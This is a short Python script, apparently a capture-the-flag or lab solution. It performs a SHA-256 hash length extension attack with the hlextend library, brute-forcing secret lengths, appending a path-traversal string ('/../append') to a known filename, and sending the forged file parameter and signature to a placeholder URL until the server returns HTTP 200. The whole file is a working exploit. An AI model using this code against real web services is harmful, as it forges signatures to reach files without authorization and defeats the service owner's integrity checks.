import requests
import hlextend

#data to append
mydata = '/../append'
#data known to the user
knowndata = 'file.txt'
#oryginal hash value
knownhash = '1a3fba6098ff2e390c82c36538509af3e314f398969f93145b97d39429e032f8'

hash = hlextend.new('sha256')
#guessing the secret length
for i in range (1,50):
    newfile = hash.extend(mydata,knowndata,i,knownhash)
    newfile = newfile.replace('\\x','%')
    newhash = hash.hexdigest()
    url = 'http://oryginal_url?file='+newfile+'&signature='+newhash
    r = requests.get(url)
    if r.status_code == 200:
        print url
    else:
        print "nope" + str(i)
